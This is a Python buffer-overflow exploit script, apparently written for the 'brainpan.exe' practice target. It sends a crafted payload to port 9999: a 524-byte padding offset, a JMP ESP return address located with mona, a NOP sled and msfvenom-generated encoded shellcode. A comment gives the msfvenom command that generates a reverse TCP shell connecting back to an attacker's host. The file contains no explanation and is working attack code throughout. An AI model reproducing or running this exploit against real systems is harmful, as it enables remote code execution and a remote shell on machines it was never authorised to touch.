#!/usr/bin/python

import socket
import sys


#msf-pattern_offset -l 1000 -q 35724134
size = 524

nops = "\x90" * 10

# !mona find -s "\xff\xe4" -m brainpan.exe
#311712F3
eip = "\xf3\x12\x17\x31"

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=port -f c R -e x86/alpha_upper -b "\x00"
shellcode = ("\x89\xe1\xdd\xc7\xd9\x71\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43\x43"
"\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58\x34\x41"
"\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42"
"\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
"\x38\x41\x43\x4a\x4a\x49\x36\x51\x39\x4b\x4b\x47\x4a\x43\x31"
"\x43\x57\x33\x31\x43\x53\x5a\x54\x42\x4b\x39\x4d\x31\x58\x30"
"\x53\x56\x38\x4d\x4d\x50\x4a\x33\x31\x49\x58\x30\x47\x4f\x58"
"\x4d\x4d\x50\x51\x59\x53\x49\x4c\x39\x43\x58\x49\x50\x4f\x58"
"\x57\x37\x4d\x55\x45\x38\x45\x52\x53\x30\x44\x51\x31\x4c\x4c"
"\x49\x4b\x51\x38\x30\x35\x36\x56\x30\x46\x31\x46\x33\x38\x33"
"\x54\x43\x4d\x59\x4b\x51\x58\x4d\x4d\x50\x50\x52\x52\x48\x42"
"\x4e\x36\x4f\x54\x33\x42\x48\x32\x48\x56\x4f\x36\x4f\x55\x32"
"\x53\x59\x4d\x59\x4a\x43\x31\x42\x36\x33\x4d\x59\x4d\x31\x58"
"\x30\x34\x4b\x38\x4d\x4b\x30\x41\x41")

payload = "A" * size + eip + "B" * 4 + nops + shellcode

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('IP',9999))
	s.recv(1024)
	s.send(payload)
	print('Sent payload')
	s.close()
	
except:
	print('Error')
	sys.exit()
